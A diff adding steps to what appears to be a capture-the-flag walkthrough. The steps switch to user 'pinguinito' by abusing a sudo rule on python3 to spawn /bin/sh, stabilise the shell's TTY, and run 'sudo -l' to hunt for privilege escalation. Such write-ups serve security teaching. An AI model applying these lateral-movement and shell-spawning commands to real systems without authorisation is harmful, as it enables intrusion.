@@ -67,5 +67,30 @@ export TERM=xterm
 export SHELL=bash
 ```
 
+## **As we saw in the previous step only the user pinguinito can use the python3 command at root level so let's try to change user**
+```bash
+sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
+```
+![image](https://github.com/user-attachments/assets/3e3053ac-29f7-4565-aa28-e79532b1811b)
+## **Treatment of tty**
+```bash
+script /dev/null -c bash
+"CTRL+Z"
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+## **Once inside it's time to escalate privileges**
+```bash
+sudo -l
+```
+![image](https://github.com/user-attachments/assets/0acfea2b-b7ff-45f0-8c93-9a9fec46d86d)
+![image](https://github.com/user-attachments/assets/33ce0d41-31af-49dd-8980-8d552bd1441b)
+
+
+
+
 
 
